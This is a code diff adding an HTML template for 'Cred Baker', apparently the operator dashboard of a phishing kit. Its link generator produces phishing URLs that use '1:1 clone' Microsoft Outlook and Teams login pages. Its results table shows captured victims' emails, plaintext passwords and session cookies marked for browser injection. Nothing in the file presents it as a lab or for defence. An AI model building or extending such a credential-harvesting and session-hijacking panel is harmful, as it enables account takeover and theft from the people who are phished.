@@ -1,0 +1,73 @@
+{% extends "layout.html" %}
+
+{% block title %}Cred Baker Dashboard{% endblock %}
+
+{% block content %}
+<div class="container mt-4">
+    <div class="card mb-4 border-0 shadow-sm" style="background-color: #f8f9fa;">
+    <div class="card-body">
+    <h3>Link Generator</h3>
+    <form action="/phish/create_link" method="post">
+    <div class="row">
+    <div class="col-md-4 mb-3">
+    <label>Target Domain (e.g. login.mycompany.com)</label>
+    <input type="text" name="domain" class="form-control" placeholder="microsoft.com" required>
+    </div>
+    <div class="col-md-8 mb-3">
+    <label>Brand Template</label>
+    <select name="brand" class="form-control">
+    <option value="outlook">Microsoft Outlook (1:1 Clone)</option>
+    <option value="teams">Microsoft Teams (1:1 Clone)</option>
+    <option value="login">Generic Login</option>
+    </select>
+    </div>
+    <div class="col-12">
+    <button type="submit" class="btn btn-primary">Generate Phishing URL</button>
+    </div>
+    </div>
+    </form>
+    </div>
+   </div>
+
+    <h3>Captured Credentials</h3>
+    <div class="card border-0">
+    <div class="card-body">
+    <div class="table-responsive">
+    <table class="table table-hover align-middle">
+    <thead class="table-light">
+    <tr>
+    <th>Brand</th>
+    <th>Email</th>
+    <th>Password</th>
+    <th>Cookie (For Browser Injection)</th>
+    <th>Date</th>
+    </tr>
+    </thead>
+    <tbody>
+    {% if creds %}
+    {% for cred in creds %}
+    <tr>
+    <td><span class="badge bg-primary">{{ cred.brand }}</span></td>
+    <td>{{ cred.email }}</td>
+    <td>{{ cred.password }}</td>
+    <td><code style="font-size: 10px;">{{ cred.session_cookie[:30] }}...</code></td>
+    <td>{{ cred.timestamp }}</td>
+    </tr>
+    {% endfor %}
+    {% else %}
+    <tr><td colspan="5">No credentials captured yet.</td></tr>
+    {% endif %}
+    </tbody>
+    </table>
+    </div>
+    </div>
+    </div>
+</div>
+
+<script>
+   // Simple fetcher for the data
+   async function loadCreds() {
+    // Placeholder if backend doesn't serve it directly in the old way
+  }
+</script>
+{% endblock %}
